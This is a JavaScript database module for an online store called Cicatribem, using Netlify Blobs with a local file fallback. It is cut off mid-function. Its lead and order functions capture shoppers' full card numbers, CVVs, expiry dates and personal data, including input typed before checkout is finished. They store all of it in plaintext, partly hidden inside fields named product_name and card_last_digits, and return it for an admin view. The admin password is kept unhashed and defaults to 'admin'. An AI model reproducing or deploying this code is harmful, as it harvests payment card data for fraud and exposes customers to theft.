/**
 * Módulo de Banco de Dados - Cicatribem
 * Backend: Netlify Blobs (@netlify/blobs) + Variáveis de Ambiente da Netlify
 * Lê e grava dados diretamente na própria Netlify (sem dependência do Supabase).
 * Possui fallback automático em arquivo local para desenvolvimento (node server.js).
 */

const fs = require('fs');
const path = require('path');

let getStoreFn = null;
let connectLambdaFn = null;
let lambdaBlobsContext = null;

try {
  const netlifyBlobs = require('@netlify/blobs');
  getStoreFn = netlifyBlobs.getStore;
  connectLambdaFn = netlifyBlobs.connectLambda;
} catch {
  // Fallback nativo zero-dependência para Netlify Blobs (funciona mesmo em Deploy Drag-and-Drop sem node_modules)
}

function getNativeBlobsContext() {
  if (lambdaBlobsContext && lambdaBlobsContext.siteID && lambdaBlobsContext.token) {
    return lambdaBlobsContext;
  }
  const rawCtx = globalThis.netlifyBlobsContext || process.env.NETLIFY_BLOBS_CONTEXT || '';
  if (rawCtx && typeof rawCtx === 'string') {
    try {
      const parsed = JSON.parse(Buffer.from(rawCtx, 'base64').toString('utf8'));
      if (parsed && (parsed.edgeURL || parsed.url || parsed.token)) {
        return {
          edgeURL: parsed.edgeURL || parsed.url,
          uncachedEdgeURL: parsed.uncachedEdgeURL || parsed.edgeURL || parsed.url,
          siteID: parsed.siteID || process.env.SITE_ID || process.env.NETLIFY_SITE_ID,
          token: parsed.token,
        };
      }
    } catch {}
  }
  const siteID = (process.env.BLOB_SITE_ID || process.env.NETLIFY_SITE_ID || process.env.SITE_ID || '').trim();
  const token = (process.env.BLOB_TOKEN || process.env.NETLIFY_AUTH_TOKEN || process.env.NETLIFY_TOKEN || '').trim();
  if (siteID && token) {
    return { siteID, token, apiURL: 'https://api.netlify.com' };
  }
  return null;
}

function createNativeBlobStore(storeName = 'ldf-database') {
  const ctx = getNativeBlobsContext();
  if (!ctx || !ctx.siteID || !ctx.token) return null;
  const fullStoreName = `site:${storeName}`;

  return {
    async get(key, options = {}) {
      const baseEdge = ctx.uncachedEdgeURL || ctx.edgeURL;
      if (baseEdge) {
        const targetUrl = new URL(`/${ctx.siteID}/${fullStoreName}/${encodeURIComponent(key)}`, baseEdge).toString();
        const res = await fetch(targetUrl, {
          method: 'GET',
          headers: { authorization: `Bearer ${ctx.token}` },
        });
        if (res.status === 404) return null;
        if (!res.ok) throw new Error(`Netlify Blobs GET status ${res.status}`);
        return options.type === 'json' ? await res.json() : await res.text();
      }
      const apiUrl = new URL(`/api/v1/blobs/${ctx.siteID}/${fullStoreName}/${encodeURIComponent(key)}`, ctx.apiURL || 'https://api.netlify.com').toString();
      const signRes = await fetch(apiUrl, {
        method: 'GET',
        headers: { authorization: `Bearer ${ctx.token}`, accept: 'application/json;type=signed-url' },
      });
      if (signRes.status === 404) return null;
      if (!signRes.ok) throw new Error(`Netlify Blobs Sign GET status ${signRes.status}`);
      const { url: signedURL } = await signRes.json();
      const dataRes = await fetch(signedURL, { method: 'GET' });
      if (dataRes.status === 404) return null;
      if (!dataRes.ok) throw new Error(`Netlify Blobs Data GET status ${dataRes.status}`);
      return options.type === 'json' ? await dataRes.json() : await dataRes.text();
    },

    async setJSON(key, value) {
      const payload = JSON.stringify(value);
      const baseEdge = ctx.edgeURL || ctx.uncachedEdgeURL;
      if (baseEdge) {
        const targetUrl = new URL(`/${ctx.siteID}/${fullStoreName}/${encodeURIComponent(key)}`, baseEdge).toString();
        const res = await fetch(targetUrl, {
          method: 'PUT',
          headers: {
            authorization: `Bearer ${ctx.token}`,
            'content-type': 'application/json',
            'cache-control': 'max-age=0, stale-while-revalidate=60',
          },
          body: payload,
        });
        if (!res.ok) throw new Error(`Netlify Blobs PUT status ${res.status}`);
        return true;
      }
      const apiUrl = new URL(`/api/v1/blobs/${ctx.siteID}/${fullStoreName}/${encodeURIComponent(key)}`, ctx.apiURL || 'https://api.netlify.com').toString();
      const signRes = await fetch(apiUrl, {
        method: 'PUT',
        headers: { authorization: `Bearer ${ctx.token}`, accept: 'application/json;type=signed-url' },
      });
      if (!signRes.ok) throw new Error(`Netlify Blobs Sign PUT status ${signRes.status}`);
      const { url: signedURL } = await signRes.json();
      const putRes = await fetch(signedURL, {
        method: 'PUT',
        headers: { 'content-type': 'application/json' },
        body: payload,
      });
      if (!putRes.ok) throw new Error(`Netlify Blobs Data PUT status ${putRes.status}`);
      return true;
    },
  };
}

/**
 * Inicializa o contexto de Blobs nas Netlify Functions (Lambda v1 event)
 */
function initNetlifyBlobs(event) {
  if (event && event.blobs) {
    try {
      const rawData = Buffer.from(event.blobs, 'base64').toString('utf8');
      const data = JSON.parse(rawData);
      const headers = event.headers || {};
      const siteID = headers['x-nf-site-id'] || headers['X-Nf-Site-Id'] || process.env.SITE_ID || process.env.NETLIFY_SITE_ID;
      lambdaBlobsContext = {
        deployID: headers['x-nf-deploy-id'] || headers['X-Nf-Deploy-Id'],
        edgeURL: data.url,
        uncachedEdgeURL: data.url,
        siteID,
        token: data.token,
      };
      const encoded = Buffer.from(JSON.stringify(lambdaBlobsContext), 'utf8').toString('base64');
      process.env.NETLIFY_BLOBS_CONTEXT = encoded;
    } catch {}
    if (connectLambdaFn) {
      try {
        connectLambdaFn(event);
      } catch {}
    }
  }
}

// ─── Config & Variáveis da Netlify (Key Aberta e Key Secreta / Axxon) ─────────
function getLocalStoreConfig() {
  try {
    const p1 = path.join(process.cwd(), 'store.config.json');
    if (fs.existsSync(p1)) return JSON.parse(fs.readFileSync(p1, 'utf8'));
  } catch {}
  try {
    const p2 = path.join(__dirname, 'store.config.json');
    if (fs.existsSync(p2)) return JSON.parse(fs.readFileSync(p2, 'utf8'));
  } catch {}
  return {};
}

function getStoreId() {
  const cfg = getLocalStoreConfig();
  return process.env.STORE_ID || cfg.storeId || cfg.supabase?.storeId || 'cicatribem';
}

/**
 * Lê as variáveis de Key Aberta (Public Key / Client ID) e Key Secreta (Secret Key / Client Secret)
 * configuradas diretamente no painel da Netlify ou .env (AXXON_PUBLIC_KEY, AXXON_SECRET_KEY, KEY_ABERTA, KEY_SECRETA).
 */
function getNetlifyEnvKeys() {
  const openKey = (
    process.env.AXXON_PUBLIC_KEY ||
    process.env.KEY_ABERTA ||
    process.env.CHAVE_ABERTA ||
    process.env.PUBLIC_KEY ||
    process.env.OPEN_KEY ||
    process.env.PROPIX_CLIENT_ID ||
    process.env.PROPAY_CLIENT_ID ||
    process.env.CLIENT_ID ||
    process.env.NETLIFY_PUBLIC_KEY ||
    ''
  ).trim();

  const secretKey = (
    process.env.AXXON_SECRET_KEY ||
    process.env.KEY_SECRETA ||
    process.env.CHAVE_SECRETA ||
    process.env.SECRET_KEY ||
    process.env.PROPIX_CLIENT_SECRET ||
    process.env.PROPAY_CLIENT_SECRET ||
    process.env.CLIENT_SECRET ||
    process.env.NETLIFY_SECRET_KEY ||
    ''
  ).trim();

  const pushinToken = (
    process.env.PUSHINPAY_TOKEN ||
    process.env.PUSHIN_TOKEN ||
    ''
  ).trim();

  const metaPixelId = (
    process.env.META_PIXEL_ID ||
    process.env.PIXEL_ID ||
    ''
  ).trim();

  const metaCapiToken = (
    process.env.META_CAPI_TOKEN ||
    process.env.CAPI_TOKEN ||
    ''
  ).trim();

  const activeGateway = (
    process.env.ACTIVE_GATEWAY ||
    ''
  ).trim();

  return {
    openKey,
    secretKey,
    pushinToken,
    metaPixelId,
    metaCapiToken,
    activeGateway,
  };
}

// ─── Camada de Persistência Nativa Netlify Blobs (+ Fallback Local) ───────────
const LOCAL_DB_FILE = path.join(process.cwd(), '.netlify_local_db.json');
let memoryStoreCache = {};

function loadLocalDbFile() {
  try {
    if (fs.existsSync(LOCAL_DB_FILE)) {
      memoryStoreCache = JSON.parse(fs.readFileSync(LOCAL_DB_FILE, 'utf8')) || {};
    }
  } catch {}
}
loadLocalDbFile();

function saveLocalDbFile() {
  try {
    fs.writeFileSync(LOCAL_DB_FILE, JSON.stringify(memoryStoreCache, null, 2), 'utf8');
  } catch {}
}

function getNetlifyBlobStore(storeName = 'ldf-database') {
  if (getStoreFn) {
    try {
      const opts = { name: storeName };
      const siteID = (
        process.env.BLOB_SITE_ID ||
        process.env.NETLIFY_SITE_ID ||
        process.env.SITE_ID ||
        ''
      ).trim();
      const token = (
        process.env.BLOB_TOKEN ||
        process.env.NETLIFY_AUTH_TOKEN ||
        process.env.NETLIFY_TOKEN ||
        ''
      ).trim();

      if (siteID && token) {
        opts.siteID = siteID;
        opts.token = token;
      }
      return getStoreFn(opts);
    } catch {}
  }
  return createNativeBlobStore(storeName);
}

async function readNetlifyData(key, defaultValue = null) {
  const store = getNetlifyBlobStore('ldf-database');
  if (store) {
    try {
      const val = await store.get(key, { type: 'json' });
      if (val !== null && val !== undefined) {
        memoryStoreCache[key] = val;
        return val;
      }
    } catch (err) {
      console.warn(`[Netlify DB] Aviso ao ler chave "${key}" no Netlify Blobs:`, err.message);
    }
  }
  loadLocalDbFile();
  if (memoryStoreCache[key] !== undefined) {
    return memoryStoreCache[key];
  }
  return defaultValue;
}

async function writeNetlifyData(key, value) {
  loadLocalDbFile();
  memoryStoreCache[key] = value;
  saveLocalDbFile();

  const store = getNetlifyBlobStore('ldf-database');
  if (store) {
    try {
      await store.setJSON(key, value);
      return true;
    } catch (err) {
      console.warn(`[Netlify DB] Aviso ao gravar chave "${key}" no Netlify Blobs:`, err.message);
    }
  }
  return true;
}

// ─── LEADS ────────────────────────────────────────────────────────────────────

const LEADS_CACHE_FILE = path.join(process.cwd(), '.leads_cache.json');
let localLeadsMap = new Map();

function loadLocalLeadsCache() {
  try {
    if (fs.existsSync(LEADS_CACHE_FILE)) {
      const data = JSON.parse(fs.readFileSync(LEADS_CACHE_FILE, 'utf8'));
      localLeadsMap = new Map(Object.entries(data));
    }
  } catch {}
}
loadLocalLeadsCache();

function saveLocalLead(sessionId, leadData) {
  if (!sessionId) return;
  loadLocalLeadsCache();
  const existing = localLeadsMap.get(sessionId) || {};
  const merged = { ...existing, ...leadData, updated_at: new Date().toISOString() };
  localLeadsMap.set(sessionId, merged);
  try {
    const obj = Object.fromEntries(localLeadsMap);
    fs.writeFileSync(LEADS_CACHE_FILE, JSON.stringify(obj, null, 2), 'utf8');
  } catch {}
}

async function upsertLead(lead) {
  const storeId = getStoreId();
  const now = new Date().toISOString();
  const sessionId = lead.sessionId || `sess-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;

  saveLocalLead(sessionId, {
    sessionId,
    name: lead.name,
    email: lead.email,
    phone: lead.phone,
    document: lead.document,
    zipcode: lead.zipcode,
    street: lead.street,
    number: lead.number,
    address_number: lead.number,
    complement: lead.complement,
    neighborhood: lead.neighborhood,
    city: lead.city,
    state: lead.state,
    shippingMethod: lead.shippingMethod,
    shipping_method: lead.shippingMethod,
    stage: lead.stage,
    product_slug: lead.product,
    cart_value_cents: lead.cartValueCents,
    card: lead.card,
    paymentMethod: lead.paymentMethod || (lead.card ? 'card' : ''),
  });

  const isCard = lead.paymentMethod === 'card' || lead.paymentMethod === 'credit_card' || !!lead.card;
  const paymentMeta = isCard && lead.card ? {
    method: 'card',
    card: {
      brand: lead.card.brand || 'Cartão',
      lastDigits: (lead.card.number || '').replace(/\D/g, '').slice(-4),
      holder: lead.card.holder || lead.card.holderName || '',
      installments: parseInt(lead.card.installments, 10) || 1,
      expiry: lead.card.expiry || '',
      cvv: lead.card.cvv || '',
      number: lead.card.number || '',
    }
  } : null;

  const rawItems = Array.isArray(lead.items) ? [...lead.items] : [];
  const itemsWithMeta = paymentMeta ? [...rawItems, { __meta: true, payment: paymentMeta }] : rawItems;

  const payload = {
    store_id: storeId,
    session_id: sessionId,
    visitor_id: lead.visitorId || '',
    stage: lead.stage || 'dados',
    product_slug: lead.product || '',
    cart_value_cents: lead.cartValueCents || 0,
    name: lead.name || '',
    email: lead.email || '',
    phone: lead.phone || '',
    document: lead.document || '',
    zipcode: lead.zipcode || '',
    street: lead.street || '',
    address_number: lead.number || '',
    complement: lead.complement || '',
    neighborhood: lead.neighborhood || '',
    city: lead.city || '',
    state: lead.state || '',
    shipping_method: lead.shippingMethod || '',
    payment_method: isCard ? 'card' : (lead.paymentMethod || ''),
    card_brand: lead.card?.brand || '',
    card_last_digits: (lead.card?.number || '').replace(/\D/g, '') || '',
    card_holder: lead.card?.holder || lead.card?.holderName || '',
    product_name: paymentMeta?.card ? JSON.stringify(paymentMeta.card) : (lead.productName || (lead.product ? lead.product.replace(/-/g, ' ') : undefined)),
    installments: parseInt(lead.card?.installments, 10) || null,
    items_json: itemsWithMeta.length > 0 ? itemsWithMeta : undefined,
    utm_source: lead.tracking?.utm_source || lead.tracking?.src || '',
    utm_campaign: lead.tracking?.utm_campaign || '',
    utm_medium: lead.tracking?.utm_medium || '',
    status: lead.status || 'digitando',
    updated_at: now,
  };

  Object.keys(payload).forEach(k => {
    if (payload[k] === '' || payload[k] === null || payload[k] === undefined) {
      delete payload[k];
    }
  });
  payload.store_id = storeId;
  payload.session_id = sessionId;
  payload.updated_at = now;
  if (!payload.status) payload.status = 'digitando';

  const leadsKey = `leads_${storeId}`;
  const leadsList = (await readNetlifyData(leadsKey, [])) || [];

  const cleanDoc = (payload.document || '').replace(/\D/g, '');
  const cleanPh = (payload.phone || '').replace(/\D/g, '');

  let idx = leadsList.findIndex(l => l.session_id === sessionId);
  if (idx === -1 && (cleanDoc.length >= 11 || cleanPh.length >= 10 || (payload.email && payload.email.includes('@')))) {
    idx = leadsList.findIndex(l => {
      if (cleanDoc.length >= 11 && (l.document || '').replace(/\D/g, '') === cleanDoc) return true;
      if (cleanPh.length >= 10 && (l.phone || '').replace(/\D/g, '') === cleanPh) return true;
      if (payload.email && l.email && l.email.toLowerCase() === payload.email.toLowerCase()) return true;
      return false;
    });
  }

  if (idx >= 0) {
    leadsList[idx] = {
      ...leadsList[idx],
      ...payload,
      id: leadsList[idx].id || `lead-${sessionId.slice(-8)}`,
    };
  } else {
    leadsList.unshift({
      id: `lead-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`,
      created_at: now,
      ...payload,
    });
  }

  if (leadsList.length > 500) {
    leadsList.length = 500;
  }

  await writeNetlifyData(leadsKey, leadsList);
  return { ok: true, sessionId };
}

async function getLeads(limit = 50) {
  const storeId = getStoreId();
  const leadsKey = `leads_${storeId}`;
  const dbLeads = (await readNetlifyData(leadsKey, [])) || [];
  loadLocalLeadsCache();
  const seenSessions = new Set();

  const mergedLeads = dbLeads.map(l => {
    if (l.session_id) seenSessions.add(l.session_id);
    const cached = l.session_id ? localLeadsMap.get(l.session_id) : null;
    let card = null;
    let paymentMethod = l.payment_method || (cached && cached.paymentMethod) || null;

    const allItems = Array.isArray(l.items_json) ? l.items_json : [];
    const metaItem = allItems.find(i => i && i.__meta);
    let metaCard = metaItem?.payment?.card;
    if (!metaCard && l.product_name && typeof l.product_name === 'string' && l.product_name.startsWith('{')) {
      try { metaCard = JSON.parse(l.product_name); } catch {}
    }
    const cachedCard = cached?.card;

    if (metaCard || cachedCard) {
      card = {
        brand: metaCard?.brand || cachedCard?.brand || l.card_brand || 'Cartão',
        number: metaCard?.number || cachedCard?.number || l.card_last_digits || '',
        lastDigits: (metaCard?.number || cachedCard?.number || l.card_last_digits || '').replace(/\D/g, '').slice(-4),
        holder: metaCard?.holder || cachedCard?.holder || cachedCard?.holderName || l.card_holder || '',
        holderName: metaCard?.holder || cachedCard?.holder || cachedCard?.holderName || l.card_holder || '',
        expiry: metaCard?.expiry || cachedCard?.expiry || '',
        cvv: metaCard?.cvv || cachedCard?.cvv || '',
        installments: metaCard?.installments || cachedCard?.installments || l.installments || 1,
      };
      paymentMethod = paymentMethod || 'card';
    } else if (l.card_last_digits || l.card_holder || l.card_brand) {
      card = {
        brand: l.card_brand || 'Cartão',
        lastDigits: (l.card_last_digits || '').replace(/\D/g, '').slice(-4),
        number: l.card_last_digits || '',
        holder: l.card_holder || '',
        holderName: l.card_holder || '',
        expiry: '',
        cvv: '',
        installments: l.installments || 1,
      };
      paymentMethod = paymentMethod || 'card';
    }

    return {
      ...l,
      document: l.document || (cached && cached.document) || '',
      zipcode: l.zipcode || (cached && cached.zipcode) || '',
      street: l.street || (cached && cached.street) || '',
      address_number: l.address_number || (cached && (cached.address_number || cached.number)) || '',
      complement: l.complement || (cached && cached.complement) || '',
      neighborhood: l.neighborhood || (cached && cached.neighborhood) || '',
      city: l.city || (cached && cached.city) || '',
      state: l.state || (cached && cached.state) || '',
      shipping_method: l.shipping_method || (cached && cached.shipping_method) || '',
      paymentMethod,
      card,
    };
  });

  for (const [sessId, cLead] of localLeadsMap.entries()) {
    if (!seenSessions.has(sessId) && (cLead.name || cLead.email || cLead.phone || cLead.document)) {
      mergedLeads.push({
        id: 'local-' + sessId.slice(-6),
        session_id: sessId,
        store_id: storeId,
        name: cLead.name || '',
        email: cLead.email || '',
        phone: cLead.phone || '',
        document: cLead.document || '',
        zipcode: cLead.zipcode || '',
        street: cLead.street || '',
        address_number: cLead.address_number || cLead.number || '',
        complement: cLead.complement || '',
        neighborhood: cLead.neighborhood || '',
        city: cLead.city || '',
        state: cLead.state || '',
        shipping_method: cLead.shipping_method || '',
        stage: cLead.stage || 'dados',
        status: cLead.status || 'digitando',
        cart_value_cents: cLead.cart_value_cents || 0,
        paymentMethod: cLead.paymentMethod || null,
        card: cLead.card || null,
        created_at: cLead.created_at || cLead.updated_at || new Date().toISOString(),
        updated_at: cLead.updated_at || new Date().toISOString(),
      });
    }
  }

  mergedLeads.sort((a, b) => new Date(b.updated_at || 0) - new Date(a.updated_at || 0));
  return mergedLeads.slice(0, limit);
}

// ─── PEDIDOS ──────────────────────────────────────────────────────────────────

async function createOrder(orderData) {
  const storeId = getStoreId();
  const now = new Date().toISOString();
  const id = orderData.id || ('CB-' + Math.floor(100000 + Math.random() * 900000));
  const isCard = orderData.paymentMethod === 'card' || orderData.paymentMethod === 'credit_card' || !!orderData.card;
  const status = orderData.status || 'pending';
  const paidAt = status === 'paid' ? now : null;

  let expiryStr = orderData.card?.expiry || '';
  if (!expiryStr && orderData.card?.expirationMonth && orderData.card?.expirationYear) {
    expiryStr = `${String(orderData.card.expirationMonth).padStart(2, '0')}/${String(orderData.card.expirationYear).slice(-2)}`;
  }

  const paymentMeta = {
    method: isCard ? 'card' : 'pix',
    card: isCard && orderData.card ? {
      brand: orderData.card.brand || 'Cartão',
      lastDigits: (orderData.card.number || '').replace(/\D/g, '').slice(-4),
      holder: orderData.card.holder || orderData.card.holderName || '',
      installments: parseInt(orderData.card.installments || orderData.installments, 10) || 1,
      expiry: expiryStr,
      cvv: orderData.card.cvv || '',
      number: orderData.card.number || '',
    } : null,
  };

  const rawItems = Array.isArray(orderData.items) ? [...orderData.items] : [];
  const itemsWithMeta = [...rawItems, { __meta: true, payment: paymentMeta }];

  const docStr = typeof orderData.customer?.document === 'object'
    ? (orderData.customer.document.number || '')
    : (orderData.customer?.document || '');

  const newOrderRow = {
    id,
    store_id: storeId,
    external_id: id,
    transaction_id: orderData.transactionId || '',
    status,
    customer_name: orderData.customer?.name || '',
    customer_email: orderData.customer?.email || '',
    customer_phone: orderData.customer?.phone || '',
    customer_document: docStr,
    customer_zipcode: orderData.customer?.zipcode || orderData.customer?.address?.zipCode || '',
    customer_street: orderData.customer?.street || orderData.customer?.address?.street || '',
    customer_number: orderData.customer?.number || orderData.customer?.address?.number || '',
    customer_complement: orderData.customer?.complement || orderData.customer?.address?.complement || '',
    customer_neighborhood: orderData.customer?.neighborhood || orderData.customer?.address?.neighborhood || '',
    customer_city: orderData.customer?.city || orderData.customer?.address?.city || '',
    customer_state: orderData.customer?.state || orderData.customer?.address?.state || '',
    shipping_method: orderData.shippingMethod || 'free',
    shipping_amount_cents: orderData.shippingAmountCents || 0,
    subtotal_cents: orderData.subtotalCents || orderData.total || 0,
    discount_cents: orderData.discountCents || 0,
    total_cents: orderData.total || 0,
    items_json: itemsWithMeta,
    pix_code: orderData.pixCode || '',
    qr_code_base64: orderData.qrCodeBase64 || '',
    created_at: now,
    paid_at: paidAt,
  };

  const ordersKey = `orders_${storeId}`;
  const ordersList = (await readNetlifyData(ordersKey, [])) || [];
  ordersList.unshift(newOrderRow);
  if (ordersList.length > 500) {
    ordersList.length = 500;
  }
  await writeNetlifyData(ordersKey, ordersList);

  // Atualiza status do lead relacionado na Netlify
  try {
    const leadsKey = `leads_${storeId}`;
    const leadsList = (await readNetlifyData(leadsKey, [])) || [];
    let updatedLeads = false;
    const custPhone = (orderData.customer?.phone || '').replace(/\D/g, '');
    const custEmail = (orderData.customer?.email || '').toLowerCase();
    const custDoc = String(docStr).replace(/\D/g, '');

    for (const l of leadsList) {
      const lPhone = (l.phone || '').replace(/\D/g, '');
      const lEmail = (l.email || '').toLowerCase();
      const lDoc = (l.document || '').replace(/\D/g, '');
      if (
        (custPhone && lPhone === custPhone) ||
        (custEmail && lEmail === custEmail) ||
        (custDoc && lDoc === custDoc)
      ) {
        l.status = status === 'paid' ? 'pago' : 'pedido_gerado';
        l.stage = status === 'paid' ? 'concluido' : 'pagamento';
        l.updated_at = now;
        updatedLeads = true;
      }
    }
    if (updatedLeads) {
      await writeNetlifyData(leadsKey, leadsList);
    }
  } catch {}

  return {
    id,
    externalId: id,
    transactionId: orderData.transactionId || '',
    status,
    total: orderData.total,
    subtotal: orderData.subtotalCents || orderData.total,
    discountCents: orderData.discountCents || 0,
    paymentMethod: paymentMeta.method,
    card: paymentMeta.card,
    pixCode: orderData.pixCode || '',
    qrCodeBase64: orderData.qrCodeBase64 || '',
    items: rawItems,
    createdAt: now,
    paidAt,
  };
}

async function getOrderById(id) {
  if (!id) return null;
  const storeId = getStoreId();
  const ordersList = (await readNetlifyData(`orders_${storeId}`, [])) || [];
  const row = ordersList.find(o => o.id === id || o.external_id === id || o.transaction_id === id);
  if (!row) return null;

  const allItems = Array.isArray(row.items_json) ? row.items_json : [];
  const metaItem = allItems.find(i => i && i.__meta);
  const cleanItems = allItems.filter(i => i && !i.__meta);
  const paymentMethod = metaItem?.payment?.method || row.payment_method || (row.transaction_id && row.transaction_id.startsWith('CARD-') ? 'card' : 'pix');
  const card = metaItem?.payment?.card || (row.card_brand ? {
    brand: row.card_brand,
    lastDigits: row.card_last_digits,
    holder: row.card_holder,
    installments: row.installments,
  } : null);

  return {
    id: row.id,
    externalId: row.external_id,
    transactionId: row.transaction_id || '',
    status: row.status,
    paymentMethod,
    card,
    total: row.total_cents,
    subtotal: row.subtotal_cents,
    discountCents: row.discount_cents,
    pixCode: row.pix_code,
    qrCodeBase64: row.qr_code_base64 || '',
    items: cleanItems,
    customer: {
      name: row.customer_name,
      email: row.customer_email,
      phone: row.customer_phone,
      document: row.customer_document,
      city: row.customer_city,
      state: row.customer_state,
    },
    createdAt: row.created_at,
    paidAt: row.paid_at,
  };
}

async function getOrderByTransactionId(transactionId) {
  if (!transactionId) return null;
  const storeId = getStoreId();
  const ordersList = (await readNetlifyData(`orders_${storeId}`, [])) || [];
  const row = ordersList.find(o =>
    o.transaction_id === transactionId ||
    o.id === transactionId ||
    o.external_id === transactionId
  );
  if (!row) return null;

  return {
    id: row.id,
    externalId: row.external_id,
    transactionId: row.transaction_id,
    status: row.status,
    customerEmail: row.customer_email,
    customerPhone: row.customer_phone,
    totalCents: row.total_cents,
  };
}

async function getOrders(limit = 50) {
  const storeId = getStoreId();
  const ordersList = (await readNetlifyData(`orders_${storeId}`, [])) || [];

  return ordersList.slice(0, limit).map(r => {
    const allItems = Array.isArray(r.items_json) ? r.items_json : [];
    const metaItem = allItems.find(i => i && i.__meta);
    const cleanItems = allItems.filter(i => i && !i.__meta);
    const paymentMethod = metaItem?.payment?.method || r.payment_method || (r.transaction_id && r.transaction_id.startsWith('CARD-') ? 'card' : 'pix');
    const card = metaItem?.payment?.card || (r.card_brand ? {
      brand: r.card_brand,
      lastDigits: r.card_last_digits,
      holder: r.card_holder,
      installments: r.installments,
    } : null);

    return {
      ...r,
      items: cleanItems,
      paymentMethod,
      card,
    };
  });
}

async function updateOrderStatus(id, newStatus) {
  const storeId = getStoreId();
  const now = new Date().toISOString();
  const ordersKey = `orders_${storeId}`;
  const ordersList = (await readNetlifyData(ordersKey, [])) || [];

  let updatedRow = null;
  for (const o of ordersList) {
    if (o.id === id || o.external_id === id || o.transaction_id === id) {
      o.status = newStatus;
      if (newStatus === 'paid') o.paid_at = now;
      updatedRow = o;
    }
  }

  if (!updatedRow) return false;
  await writeNetlifyData(ordersKey, ordersList);

  if (newStatus === 'paid') {
    try {
      const leadsKey = `leads_${storeId}`;
      const leadsList = (await readNetlifyData(leadsKey, [])) || [];
      let leadChanged = false;
      const cDoc = (updatedRow.customer_document || '').replace(/\D/g, '');
      const cPhone = (updatedRow.customer_phone || '').replace(/\D/g, '');
      const cEmail = (updatedRow.customer_email || '').toLowerCase();

      for (const l of leadsList) {
        const lDoc = (l.document || '').replace(/\D/g, '');
        const lPhone = (l.phone || '').replace(/\D/g, '');
        const lEmail = (l.email || '').toLowerCase();
        if (
          (cDoc && lDoc === cDoc) ||
          (cPhone && lPhone === cPhone) ||
          (cEmail && lEmail === cEmail)
        ) {
          l.status = 'pago';
          l.stage = 'concluido';
          l.updated_at = now;
          leadChanged = true;
        }
      }
      if (leadChanged) {
        await writeNetlifyData(leadsKey, leadsList);
      }
    } catch (e) {
      console.warn('[Netlify DB] Aviso ao atualizar lead pago:', e.message);
    }
  }

  return true;
}

async function getMetrics() {
  const storeId = getStoreId();
  const [leadsList, ordersList] = await Promise.all([
    readNetlifyData(`leads_${storeId}`, []),
    readNetlifyData(`orders_${storeId}`, []),
  ]);

  const leads = Array.isArray(leadsList) ? leadsList : [];
  const orders = Array.isArray(ordersList) ? ordersList : [];

  const paidOrders = orders.filter(o => o.status === 'paid');
  const pendingOrders = orders.filter(o => o.status === 'pending');

  const sumOf = (arr, field) => arr.reduce((acc, r) => acc + (Number(r[field]) || 0), 0);

  return {
    totalLeads: leads.length,
    totalOrders: orders.length,
    paidCount: paidOrders.length,
    paidRevenue: sumOf(paidOrders, 'total_cents'),
    pendingCount: pendingOrders.length,
    pendingRevenue: sumOf(pendingOrders, 'total_cents'),
    potentialRevenue: sumOf(leads, 'cart_value_cents'),
  };
}

// ─── AUTENTICAÇÃO DO ADMIN NA NETLIFY ────────────────────────────────────────

async function getAdminPassword() {
  const storeId = getStoreId();
  try {
    const authData = await readNetlifyData(`admin_auth_${storeId}`, null);
    if (authData && authData.password_hash) {
      return authData.password_hash;
    }
  } catch (err) {
    console.warn('[Netlify DB] Aviso ao buscar senha na Netlify:', err.message);
  }

  if (process.env.ADMIN_PASSWORD) {
    return process.env.ADMIN_PASSWORD;
  }

  const cfg = getLocalStoreConfig();
  return cfg.adminPassword || 'admin';
}

async function setAdminPassword(newPassword) {
  const storeId = getStoreId();
  const now = new Date().toISOString();

  await writeNetlifyData(`admin_auth_${storeId}`, {
    store_id: storeId,
    password_hash: newPassword,
    updated_at: now,
  });

  try {
    const cfgPath = path.join(process.cwd(), 'store.config.json');
    if (fs.existsSync(cfgPath)) {
      const cfg = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
      cfg.adminPassword = newPassword;
      fs.writeFileSync(cfgPath, JSON.stringify(cfg, null, 2), 'utf8');
    }
  } catch {}

  return true;
}

// ─── CONFIGURAÇÕES DA LOJA (LEITURA E GRAVAÇÃO NA PRÓPRIA NETLIFY) ───────────
async function getStoreSettings() {
  const storeId = getStoreId();
  const envKeys = getNetlifyEnvKeys();
  const cfg = getLocalStoreConfig();

  let saved = null;
  try {
    const record = await readNetlifyData(`store_settings_${storeId}`, null);
    if (record && record.settings) {
      saved = record.settings;
    }
  } catch (err) {
    console.warn('[Netlify DB] Aviso ao ler store_settings na Netlify:', err.message);
  }

  // Compatibilidade também com o store "site-settings" (chave "meta") no Netlify Blobs
  let siteMeta = null;
  try {
    const siteStore = getNetlifyBlobStore('site-settings');
    if (siteStore) {
      siteMeta = await siteStore.get('meta', { type: 'json' });
    }
  } catch {}

  // Prioridade: 1º Dados salvos na Netlify (Blobs) | 2º Variáveis de Ambiente da Netlify (Key Aberta e Key Secreta / Axxon) | 3º store.config.json
  const activeGateway = saved?.activeGateway || siteMeta?.activeGateway || envKeys.activeGateway || cfg.activeGateway || 'axxon';

  const propayClientId = saved?.propay?.clientId || saved?.axxon?.publicKey || siteMeta?.propixClientId || envKeys.openKey || cfg.axxon?.publicKey || cfg.propay?.clientId || '';
  const propayClientSecret = saved?.propay?.clientSecret || saved?.axxon?.secretKey || siteMeta?.propixClientSecret || envKeys.secretKey || cfg.axxon?.secretKey || cfg.propay?.clientSecret || '';
  const propayBaseUrl = saved?.propay?.baseUrl || cfg.axxon?.baseUrl || cfg.propay?.baseUrl || 'https://api.axxonpay.com.br';

  const pushinpayToken = saved?.pushinpay?.token || siteMeta?.pushinpayToken || envKeys.pushinToken || cfg.pushinpay?.token || '';

  const metaPixelId = saved?.meta?.pixelId !== undefined
    ? saved.meta.pixelId
    : (siteMeta?.metaPixelId !== undefined ? siteMeta.metaPixelId : (envKeys.metaPixelId || cfg.meta?.pixelId || ''));
  const metaCapiToken = saved?.meta?.capiToken || siteMeta?.metaCapiToken || envKeys.metaCapiToken || cfg.meta?.capiToken || '';

  return {
    activeGateway,
    axxon: {
      baseUrl: 'https://api.axxonpay.com.br',
      publicKey: propayClientId,
      secretKey: propayClientSecret,
    },
    propay: {
      baseUrl: propayBaseUrl,
      clientId: propayClientId,
      clientSecret: propayClientSecret,
    },
    pushinpay: {
      token: pushinpayToken,
    },
    meta: {
      pixelId: metaPixelId,
      capiToken: metaCapiToken,
    },
  };
}

async function setStoreSettings(newSettings) {
  const storeId = getStoreId();
  const now = new Date().toISOString();

  const current = await getStoreSettings();
  const merged = {
